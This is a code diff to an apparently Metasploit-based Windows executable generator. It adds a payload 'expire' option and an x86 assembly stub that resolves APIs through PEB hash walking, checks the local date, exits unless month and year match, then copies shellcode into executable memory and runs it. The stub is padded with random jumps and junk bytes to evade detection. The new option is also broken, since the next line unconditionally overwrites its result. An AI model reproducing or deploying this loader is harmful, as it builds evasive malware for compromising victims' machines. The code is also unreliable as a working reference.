@@ -219,6 +219,7 @@ require 'msf/core/exe/segment_appender'
   # @param  code      [String]
   # @param  opts      [Hash]
   # @option opts      [String] :sub_method
+  # @option opts      [String] :expire, expire payload after 1 month from inception
   # @option opts      [String] :inject, Code to inject into the exe
   # @option opts      [String] :template
   # @option opts      [Symbol] :arch, Set to :x86 by default
@@ -237,9 +238,17 @@ require 'msf/core/exe/segment_appender'
 
     # Allow the user to specify their own EXE template
     set_template_default(opts, "template_x86_windows.exe")
-
+	
+	# Finally got this working
+	# Need to add option here right? Line 19 of lib\msf\core\exploit\exe.rb
+	# OptBool.new('EXE::Expire',   [false, 'Expire payload after 1 month']),
+	if opts[:expire]
+	 payload = win32_rwx_exec_expire(code)
+	end
+    
     # Copy the code to a new RWX segment to allow for self-modifying encoders
-    payload = win32_rwx_exec(code)
+	payload = win32_rwx_exec(code)
+	
 
     # Create a new PE object and run through sanity checks
     pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
@@ -1629,6 +1638,238 @@ require 'msf/core/exe/segment_appender'
     nil
   end
 
+
+  # joe thinks he should put his date check here before the shellcode is
+  # called with with an arguments true or false to add. hax
+  # systime struct requires 16 bytes of stack space
+  # [+] 0xD92CE33E = kernel32.dll!GetLocalTime
+  # [+] 0x56A2B5F0 = kernel32.dll!ExitProcess
+  def self.win32_rwx_exec_expire(code)
+	curtime = Time.new
+    stub_block = %Q^
+    ; Input: The hash of the API to call and all its parameters must be pushed onto stack.
+    ; Output: The return value from the API call will be in EAX.
+    ; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
+    ; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.
+    ; Note: This function assumes the direction flag has allready been cleared via a CLD instruction.
+    ; Note: This function is unable to call forwarded exports.
+
+    api_call:
+      pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
+      mov ebp, esp           ; Create a new stack frame
+      xor edx, edx           ; Zero EDX
+      mov edx, [fs:edx+48]   ; Get a pointer to the PEB
+      mov edx, [edx+12]      ; Get PEB->Ldr
+      mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
+    next_mod:                ;
+      mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
+      movzx ecx, word [edx+38] ; Set ECX to the length we want to check
+      xor edi, edi           ; Clear EDI which will store the hash of the module name
+    loop_modname:            ;
+      xor eax, eax           ; Clear EAX
+      lodsb                  ; Read in the next byte of the name
+      cmp al, 'a'            ; Some versions of Windows use lower case module names
+      jl not_lowercase       ;
+      sub al, 0x20           ; If so normalise to uppercase
+    not_lowercase:           ;
+      ror edi, 13            ; Rotate right our hash value
+      add edi, eax           ; Add the next byte of the name
+      ;loop loop_modname      ; Loop until we have read enough
+      ; The random jmps added below will occasionally make this offset
+      ; greater than will fit in a byte, so we have to use a regular jnz
+      ; instruction which can take a full 32-bits to accomodate the
+      ; bigger offset
+      dec ecx
+      jnz loop_modname        ; Loop until we have read enough
+      ; We now have the module hash computed
+      push edx               ; Save the current position in the module list for later
+      push edi               ; Save the current module hash for later
+      ; Proceed to iterate the export address table,
+      mov edx, [edx+16]      ; Get this modules base address
+      mov eax, [edx+60]      ; Get PE header
+      add eax, edx           ; Add the modules base address
+      mov eax, [eax+120]     ; Get export tables RVA
+      test eax, eax          ; Test if no export address table is present
+      jz get_next_mod1       ; If no EAT present, process the next module
+      add eax, edx           ; Add the modules base address
+      push eax               ; Save the current modules EAT
+      mov ecx, [eax+24]      ; Get the number of function names
+      mov ebx, [eax+32]      ; Get the rva of the function names
+      add ebx, edx           ; Add the modules base address
+      ; Computing the module hash + function hash
+    get_next_func:           ;
+      test ecx, ecx          ; Changed from jecxz to accomodate the larger offset produced by random jmps below
+      jz get_next_mod        ; When we reach the start of the EAT (we search backwards), process the next module
+      dec ecx                ; Decrement the function name counter
+      mov esi, [ebx+ecx*4]   ; Get rva of next module name
+      add esi, edx           ; Add the modules base address
+      xor edi, edi           ; Clear EDI which will store the hash of the function name
+      ; And compare it to the one we want
+    loop_funcname:           ;
+      xor eax, eax           ; Clear EAX
+      lodsb                  ; Read in the next byte of the ASCII function name
+      ror edi, 13            ; Rotate right our hash value
+      add edi, eax           ; Add the next byte of the name
+      cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
+      jne loop_funcname      ; If we have not reached the null terminator, continue
+      add edi, [ebp-8]       ; Add the current module hash to the function hash
+      cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for
+      jnz get_next_func      ; Go compute the next function hash if we have not found it
+      ; If found, fix up stack, call the function and then value else compute the next one...
+      pop eax                ; Restore the current modules EAT
+      mov ebx, [eax+36]      ; Get the ordinal table rva
+      add ebx, edx           ; Add the modules base address
+      mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
+      mov ebx, [eax+28]      ; Get the function addresses table rva
+      add ebx, edx           ; Add the modules base address
+      mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
+      add eax, edx           ; Add the modules base address to get the functions actual VA
+      ; We now fix up the stack and perform the call to the desired function...
+    finish:
+      mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
+      pop ebx                ; Clear off the current modules hash
+      pop ebx                ; Clear off the current position in the module list
+      popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
+      pop ecx                ; Pop off the origional return address our caller will have pushed
+      pop edx                ; Pop off the hash value our caller will have pushed
+      push ecx               ; Push back the correct return value
+      jmp eax                ; Jump into the required function
+      ; We now automagically return to the correct caller...
+    get_next_mod:            ;
+      pop eax                ; Pop off the current (now the previous) modules EAT
+    get_next_mod1:           ;
+      pop edi                ; Pop off the current (now the previous) modules hash
+      pop edx                ; Restore our position in the module list
+      mov edx, [edx]         ; Get the next module
+      jmp next_mod           ; Process this module
+    ^
+
+    stub_exit = %Q^
+    ; Input: EBP must be the address of 'api_call'.
+    ; Output: None.
+    ; Clobbers: EAX, EBX, (ESP will also be modified)
+    ; Note: Execution is not expected to (successfully) continue past this block
+
+    exitfunk:
+      mov ebx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...
+      push 0x9DBD95A6        ; hash( "kernel32.dll", "GetVersion" )
+      call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)
+      cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7
+      jl goodbye             ; Then just call the exit function...
+      cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
+      jne goodbye      ;
+      mov ebx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
+    goodbye:                 ; We now perform the actual call to the exit function
+      push byte 0            ; push the exit function parameter
+      push ebx               ; push the hash of the exit function
+      call ebp               ; call EXITFUNK( 0 );
+    ^
+
+    stub_alloc = %Q^
+      cld                    ; Clear the direction flag.
+      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
+    delta:                   ;
+    #{stub_block}
+    start:                   ;
+      pop ebp                ; Pop off the address of 'api_call' for calling later.
+
+    allocate_size:
+       mov esi, #{code.length}
+
+    allocate:
+;========================================	
+; need chunk of memory for SYSTIME struct
+push 40h        		; PAGE_EXECUTE_READWRITE
+push 1000h            	; MEM_COMMIT
+push 10h               	; 16 bytes needed
+push 0h            		; NULL as we dont care where the allocation is.
+push 0xE553A458        	; hash( "kernel32.dll", "VirtualAlloc" )
+call ebp               	; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+mov ebx, eax           	; Store allocated address in ebx
+lea     eax, [ebx]
+push    eax             
+push 0xD92CE33e		 	; GetLocalTime with chunk from VirtualAlloc
+call ebp 
+mov ax,cx
+; curtime = Time.new
+mov     cx, 0x#{curtime.month.to_s(16)} ; MONTH converted to hex
+cmp     cx, [ebx+2]
+jnz     short exitpart
+mov     cx, 0x#{curtime.year.to_s(16)} ; YEAR converted to hex
+cmp     cx, [ebx]
+jz      short wegood
+exitpart:
+	  push 0
+	  push 0x56A2B5F0
+	  call ebp			; ExitProcess
+
+wegood:
+; passed checks, can start shellcode now
+;=====================================	  
+      push byte 0x40         ; PAGE_EXECUTE_READWRITE
+      push 0x1000            ; MEM_COMMIT
+      push esi               ; Push the length value of the wrapped code block
+      push byte 0            ; NULL as we dont care where the allocation is.
+      push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
+      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+
+      mov ebx, eax           ; Store allocated address in ebx
+      mov edi, eax           ; Prepare EDI with the new address
+      mov ecx, esi           ; Prepare ECX with the length of the code
+      call get_payload
+    got_payload:
+      pop esi                ; Prepare ESI with the source to copy
+      rep movsb              ; Copy the payload to RWX memory
+      call set_handler       ; Configure error handling
+
+    exitblock:
+    #{stub_exit}
+    set_handler:
+      xor eax,eax
+      push dword [fs:eax]
+      mov dword [fs:eax], esp
+      call ebx
+      jmp exitblock
+    ^
+
+    stub_final = %Q^
+    get_payload:
+      call got_payload
+    payload:
+    ; Append an arbitrary payload here
+    ^
+
+    stub_alloc.gsub!('short', '')
+    stub_alloc.gsub!('byte', '')
+
+    wrapper = ""
+    # regs    = %W{eax ebx ecx edx esi edi ebp}
+
+    cnt_jmp = 0
+    stub_alloc.each_line do |line|
+      line.gsub!(/;.*/, '')
+      line.strip!
+      next if line.empty?
+
+      wrapper << "nop\n" if rand(2) == 0
+
+      if rand(2) == 0
+        wrapper << "jmp autojump#{cnt_jmp}\n"
+        1.upto(rand(8)+8) do
+          wrapper << "db 0x#{"%.2x" % rand(0x100)}\n"
+        end
+        wrapper << "autojump#{cnt_jmp}:\n"
+        cnt_jmp += 1
+      end
+      wrapper << line + "\n"
+    end
+
+    wrapper << stub_final
+
+    enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
+    enc.data + code
+  end
+
   # This wrapper is responsible for allocating RWX memory, copying the
   # target code there, setting an exception handler that calls ExitProcess
   # and finally executing the code.
@@ -1828,7 +2069,8 @@ require 'msf/core/exe/segment_appender'
     enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
     enc.data + code
   end
-
+  
+  
   # This wrapper is responsible for allocating RWX memory, copying the
   # target code there, setting an exception handler that calls ExitProcess,
   # starting the code in a new thread, and finally jumping back to the next
